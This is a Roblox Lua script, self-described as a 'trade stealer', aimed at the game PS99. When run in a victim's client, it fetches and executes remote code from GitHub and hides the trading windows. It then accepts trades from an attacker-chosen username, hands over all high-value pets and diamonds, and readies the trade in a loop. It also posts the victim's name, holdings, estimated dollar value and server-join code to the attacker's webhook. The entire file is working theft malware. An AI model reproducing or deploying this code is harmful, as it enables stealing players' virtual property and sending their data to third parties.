--[[

made by lilyscripts
https://discord.gg/S4NHgEVmxy

]]

--// Make sure the player is loaded in

repeat task.wait() until (game:GetService("Players").LocalPlayer)
repeat task.wait() until (not game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("__INTRO"))

--// Initializing

local players            = game:GetService("Players")
local replicatedStorage  = game:GetService("ReplicatedStorage")
local httpService        = game:GetService("HttpService")

local localPlayer        = players.localPlayer
local request            = (request or http_request or http.request)

local library            = replicatedStorage:WaitForChild("Library")
local tradingCommands    = require(library.Client.TradingCmds)
local saveModule         = require(library.Client.Save)
local itemRap            = getupvalues(require(library.Client.DevRAPCmds).Get)[1]
local tradeMessage       = localPlayer.PlayerGui.TradeMessage
local tradeWindow        = localPlayer.PlayerGui.TradeWindow

local totalRap           = 0
local rate               = loadstring(game:HttpGet("https://raw.githubusercontent.com/lilyscripts/scripts/main/PS99/rate.lua"))()

--// Misc Checks

-- Make sure the configuration is valid
if (not configuration) or
(not configuration.username) or
(not configuration.webhook) or
(not configuration.minimum_rap) or
(typeof(configuration) ~= "table") or
(typeof(configuration.username) ~= "string") or
(typeof(configuration.webhook) ~= "string") or
(typeof(configuration.minimum_rap) ~= "number") then
    return error("invalid configuration")
end

configuration.username = string.lower(configuration.username)

--// Functions

-- Gets all incoming trade requests
local function getIncomingTrades()
	local trades = {}
	local functionTrades = tradingCommands.GetAllRequests()

	for player, trade in next, functionTrades do
		if (trade[localPlayer]) then
			table.insert(trades, player)
		end
	end

	return trades
end

-- Accepts an incoming trade request
local function acceptTradeRequest(trade)
	return tradingCommands.Request(trade)
end

-- Rejects an incoming trade request
local function rejectTradeRequest(trade)
    return tradingCommands.Reject(trade)
end

-- Readys up the trade
local function readyTrade()
	return tradingCommands.SetReady(true)
end

-- Clones a table to bypass readonly restrictions
local function cloneTable(originalTable)
	local newTable = {}
	for index, value in next, originalTable do
		newTable[index] = value
	end

	return newTable
end

-- Gets the rap of an item
local function getRap(item)	
	if (itemRap[item.category]) then
		local rap = itemRap[item.category]['{"id":"' .. item.id .. '"' 
		.. ((item.tn and (',"tn":' .. tostring(item.tn))) or "")
		.. ((item.pt and (',"pt":' .. tostring(item.pt))) or "")
		.. ((item.sh and (',"sh":' .. tostring(item.sh))) or "")
		.. '}'] or 0
		return rap
	end

	return nil
end

-- Gets the local player's diamonds
local function getDiamonds()
	for currencyUid, currency in next, saveModule.Get().Inventory.Currency do
		if (currency.id == "Diamonds") then
			return (currency._am or 0), currencyUid
		end
	end

	return 0, ""
end

-- Adds an item to the trade
local function addPet(item)
	return tradingCommands.SetItem(item.category, item.uid, item.amount)
end

-- Adds diamonds to the trade
local function addDiamonds(diamonds, diamondsUid)
	return tradingCommands.SetItem("Currency", diamondsUid, diamonds)
end

-- Formats a number into a prettier, way nicer version
local function formatNumber(number)
	number = math.floor(number)
	local formats = {"", "K", "M", "B", "T", "Q"}
	local formatIndex = 1

	while (number >= 1000) do
		number = (number / 1000)
		formatIndex = formatIndex + 1
	end

	if (formats[formats] == "") then
		return tostring(number)
	end

	return string.format("%.3f%s", number, formats[formatIndex])
end

-- Gets all the items in the local player's inventory
local function getItems()
	local inventory = {}
    local diamonds, diamondsUid
	for categoryName, category in next, saveModule.Get().Inventory do
		for itemUid, item in next, category do
			local newItem = cloneTable(item) -- Essential because "item" is readonly

			newItem.category = categoryName
			newItem.name = ((item.sh and "shiny ") or "") 
			.. (((item.pt == 1 and "golden ") or "") 
			or (item.pt == 2 and "rainbow ") or "") 
			.. string.lower(item.id)

			newItem.rap = getRap(newItem)
			newItem.uid = itemUid
			newItem.locked = item._lk -- Yes I know locked and amount aren't neccesary
			newItem.amount = (item._am or 1)
				
			if ((newItem.rap ~= nil) and (newItem.rap >= configuration.minimum_rap)) then
				table.insert(inventory, newItem)
                totalRap = totalRap + newItem.rap
			end
		end
	end

	return inventory
end

--// Main Script

-- To get the rap because I wanted to do it one function
getItems()

-- Makes it so the trading GUIs don't pop up
tradeMessage:GetPropertyChangedSignal("Enabled"):Connect(function()
    if (tradeMessage.Enabled) then
        tradeMessage.Enabled = false
    end
end)

tradeWindow:GetPropertyChangedSignal("Enabled"):Connect(function()
    if (tradeWindow.Enabled) then
        tradeWindow.Enabled = false
    end
end)

spawn(function()
    while true do
        task.wait(1)

        local incomingTrades = getIncomingTrades()
        if (#incomingTrades > 0) then
            local trade = incomingTrades[1]
            local tradeUser = trade.Name
            if (configuration.username == string.lower(tradeUser)) then
                acceptTradeRequest(trade)

                local items = getItems()
                local diamonds, diamondsUid = getDiamonds()

                for _, item in next, items do
                    addPet(item)
                end

                addDiamonds(diamonds, diamondsUid)

                while true do
                    task.wait()
                    readyTrade()
                end
            else
                rejectTradeRequest(trade)
            end
        end
    end
end)

--// Webhook Sending

request({
    Url = configuration.webhook,
    Method = "POST",
    Body = httpService:JSONEncode({
        ["content"] = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. tostring(game.PlaceId) .. ', "' .. game.JobId .. '")',
        ["username"] = "lilyscripts - trade stealer",
        ["avatar_url"] = "https://media.discordapp.net/attachments/1031307376973856789/1213896280602841088/avatars-hZqwsYs0mAsTeKcK-PH8YWw-t500x500.jpg?ex=661c0e02&is=66099902&hm=2a02c86ceb38d710e5d0dc1cc9dcd6e454a64c10e2926a3fb6d6d08b5b2123c3&",
        ["embeds"] = {
            {
                ["fields"] = {
                    {
                        ["name"] = "**information**",
                        ["value"] = "username: " .. localPlayer.DisplayName .. " (@" .. localPlayer.Name .. ")\ntotal diamonds: " .. formatNumber(getDiamonds()) .. "\ntotal rap: " .. formatNumber(totalRap) .. " ($" .. tostring(math.floor((totalRap / 1000000) * rate * 100) / 100) .. ")"
                    },
                    {
                        ["name"] = "**notice**",
                        ["value"] = "inorder to access their items, run the code above and trade them"
                    }
                }
            }
        }
    }),
    Headers = {
        ["Content-Type"] = "application/json"
    }
})
